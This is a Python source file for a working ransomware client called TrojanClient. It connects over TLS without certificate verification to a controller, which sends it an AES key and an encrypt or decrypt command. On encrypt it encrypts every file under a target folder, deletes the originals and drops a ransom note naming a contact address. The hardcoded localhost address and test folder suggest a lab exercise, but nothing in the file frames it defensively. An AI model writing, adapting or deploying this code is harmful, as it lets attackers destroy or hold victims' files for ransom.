import socket
import ssl
import os
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
import sys
import protocol

class TrojanClient:
    def __init__(self, host, port, folder):
        self.host = host
        self.port = port
        self.folder = folder
        self.context = ssl._create_unverified_context()

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            with self.context.wrap_socket(s, server_hostname="ignored") as secure_sock:
                secure_sock.connect((self.host, self.port))
                self.handle_connection(secure_sock)

    def handle_connection(self, conn):
        aes_key = protocol.receive(conn)
        action = protocol.receive(conn).decode()

        if action == "encrypt":
            self.encrypt_all(self.folder, aes_key)
            protocol.send(conn, "the files are encrypted")
            self._show_ransom_note(encrypted=True)
        elif action == "decrypt":
            self.decrypt_all(self.folder, aes_key)
            protocol.send(conn, "the files are decrypted")
            self._show_ransom_note(encrypted=False)

    def encrypt_all(self, folder_path, key):
        for root, _, files in os.walk(folder_path):
            for name in files:
                path = os.path.join(root, name)
                with open(path, "rb") as f:
                    data = f.read()
                iv = get_random_bytes(16)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                encrypted = cipher.encrypt(pad(data, AES.block_size))
                with open(path + "_", "wb") as f:
                    f.write(iv + encrypted)
                os.remove(path)

    def decrypt_all(self, folder_path, key):
        for root, _, files in os.walk(folder_path):
            for name in files:
                if not name.endswith("_"):
                    continue
                path = os.path.join(root, name)
                with open(path, "rb") as f:
                    data = f.read()
                iv = data[:16]
                cipher = AES.new(key, AES.MODE_CBC, iv)
                decrypted = unpad(cipher.decrypt(data[16:]), AES.block_size)
                with open(path.rstrip("_"), "wb") as f:
                    f.write(decrypted)
                os.remove(path)

    def _show_ransom_note(self, encrypted=True):
        msg = (
            "🔒 All your files have been encrypted!\nContact: hackers@example.com"
            if encrypted else
            "🔓 All your files have been decrypted! Your files are back to normal."
        )
        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
            f.write(msg)
        os.system("notepad README_DECRYPT.txt")
        
        
if __name__ == "__main__":
    client = TrojanClient("127.0.0.1", 44444, "D:/check")
    client.start()